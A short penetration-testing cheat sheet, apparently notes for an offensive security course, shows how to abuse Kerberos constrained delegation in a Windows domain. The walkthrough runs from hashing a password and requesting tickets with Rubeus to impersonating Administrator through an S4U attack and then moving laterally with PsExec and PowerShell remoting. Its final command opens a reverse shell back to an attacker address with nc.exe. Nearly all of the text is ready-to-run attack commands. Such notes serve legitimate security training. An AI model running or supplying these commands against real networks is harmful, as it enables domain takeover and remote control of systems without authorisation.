> If a user we control has the "delegate to" ability on another computer we can do a delegation attack to move laterally. We start by grabbing the hash of the user using Rubeus:

```
.\Rubeus.exe hash /password:<pass>
```

> Next we request a TGT for the user:

```
.\rubeus.exe asktgt /user:<current_user> /rc4:<hash> /outfile:ticket.kirbi
```

> Now we can perform an s4u attack and impersonate the administrator (we can obtain the spn string from BloodHound):

```
.\rubeus.exe s4u /user:<current_user> /ticket:ticket.kirbi /impersonateuser:Administrator /msdsspn:"<spn_string>" /altservice:cifs,host,rpcss,http /ptt
```

> Now we can verify we have access using the command (also use klist to check):

```
dir \\<target_hostname>\c$
```

Once we have access we can move laterally by using psexec, Enter-PS Session or our custom tool called lat.exe which we make in the PEN-300 course in the WIndows Lateral Movement module. We can also save the ticket to kali and convert it to a ccache file and then use psexec to login.

```
Enter-PSSession -ComputerName <hostname>.<domain> -Authentication Kerberos
```

> With PsExec (optional parameters -h -d):

```
C:\temp\PsExec64.exe \\<hostname>.<domain> -s cmd.exe /c "C:\temp\nc.exe 192.168.x.x <port> -e cmd.exe"
```




